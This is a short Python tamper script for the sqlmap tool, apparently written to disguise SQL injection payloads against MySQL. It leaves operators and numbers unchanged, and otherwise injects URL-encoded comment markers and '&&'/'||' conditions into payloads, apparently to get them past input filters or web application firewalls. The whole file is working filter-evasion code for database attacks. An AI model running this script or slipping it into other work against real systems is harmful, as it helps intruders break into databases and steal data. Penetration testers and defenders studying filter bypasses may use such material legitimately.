#!/usr/bin/env python

"""
author:Alexsel
"""

import os
import re
from lib.core.data import kb
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    if payload:
        if(re.match("^[>=|<=]",payload)):
            return payload
        if(re.match("^-{0,1}?\d+$",payload)):
            return payload
        if(re.match("^\(SELECT",payload)):
            payload = "|| 1='%23' "+payload
            return payload
        rex = '^-{0,1}?[\d|\w]*%{0,1}[\'|"|`]*\\)*[ |;]'                        
        payload = re.sub(rex, lambda x:x.group(0)+" %26%26 1!='%23' ", payload)      
    return payload